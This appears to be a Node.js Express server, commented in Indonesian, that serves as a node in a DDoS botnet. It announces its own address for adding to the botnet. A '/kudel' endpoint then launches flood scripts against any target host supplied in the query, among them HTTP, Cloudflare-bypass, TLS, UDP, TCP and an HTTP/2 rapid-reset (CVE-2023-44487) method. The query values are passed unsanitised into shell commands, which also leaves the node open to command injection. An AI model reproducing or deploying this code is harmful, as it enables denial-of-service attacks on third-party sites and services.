const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Fungsi untuk mengambil data dari API
async function fetchData() {
  try {
    const response = await axios.get('https://httpbin.org/get');
    const data = response.data;
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;

  // Validasi parameter
  if (!host || !port || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  // Respon ke client
  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  // Daftar metode serangan
  const attackMethods = {
    'BYPASS': `node ./lib/cache/HTTP_BYPASS.js ${host} ${time} 30 1 proxy.txt`,
    'HTTP1': `node ./lib/cache/HTTP1.js ${host} ${time} 1 90 proxy.txt --debug true --query 1`,
    'CF': `node ./lib/cache/CF_BYPASS.js ${host} ${time} 30 1 proxy.txt`,
    'CVE': `node ./lib/cache/CVE-2023-44487.js GET "${host}?q=%RAND%" ${time} 1 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full`,
    'HANDSHAKE': `node ./lib/cache/HANDSHAKE.js ${host} ${time} 1 socks4.txt -debug true -socks 4`,
    'TLS': `node ./lib/cache/TLS.js ${host} ${time} 90 1 proxy.txt`,
    'SPOOF': `node ./lib/cache/SPOOF.js ${host} ${time} 90 1 proxy.txt`,
    'JID': `node ./lib/cache/JID.js ${host} ${time} 30 1 proxy.txt`,
    'UAM': `node ./lib/cache/UAM.js ${host} ${time} 90`,
    'BESTFLOOD': `node ./lib/cache/BESTFLOOD.js ${host} ${time} 1 proxy.txt 90`,
    'RAW': `node ./lib/cache/HTTP_RAW.js ${host} ${time} 30 1 proxy.txt`,
    'APACHE': `node ./lib/cache/APACHE.js ${host} ${time} 90 1 proxy.txt`,
    'UDP': `python3 ./lib/cache/UDP.py ${host} ${port} 100 1 ${time}`,
    'TCP': `python3 ./lib/cache/TCP.py ${host} ${port} 100 1 ${time}`,
    'HTTP2': `node ./lib/cache/HTTP2.js -m RAND -u ${host} -s ${time} -t 1 -p proxy.txt -r 30 -http2`,
    'MIX': `node ./lib/cache/MIX.js ${host} ${time} 90 1 proxy.txt`,
    'MIXB': `node ./lib/cache/MIXB.js ${host} ${time} 90 1 proxy.txt bypass`,
    'HTTP': `node ./lib/cache/HTTP.js ${host} ${time} 90 1 proxy.txt`,
    'FLOOD': `node ./lib/cache/FLOOD.js ${host} ${time} 90 1 proxy.txt --extra true`,
    'HTTPS': `node ./lib/cache/HTTPS.js ${host} ${time} 1 proxy.txt autorate`
  };

  // Fungsi untuk mengeksekusi perintah
  const executeCommand = (command) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
      }
      console.log(`Executed: ${command}`);
      console.log(`Output: ${stdout}`);
    });
  };

  // Cek jika methods adalah mix (format: method1+method2+method3)
  if (methods.includes('+')) {
    const methodList = methods.split('+');
    
    // Batasi maksimal 3 metode
    const selectedMethods = methodList.slice(0, 5).map(method => attackMethods[method]).filter(Boolean);
    
    if (selectedMethods.length > 0) {
      console.log(`Executing mix of ${selectedMethods.length} methods...`);
      selectedMethods.forEach(executeCommand);
    } else {
      console.log('No valid methods found in mix');
    }
  } else {
    // Eksekusi metode tunggal
    const selectedMethod = attackMethods[methods];
    if (selectedMethod) {
      executeCommand(selectedMethod);
    } else {
      console.log(`Unsupported method: ${methods}`);
    }
  }
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  fetchData();
});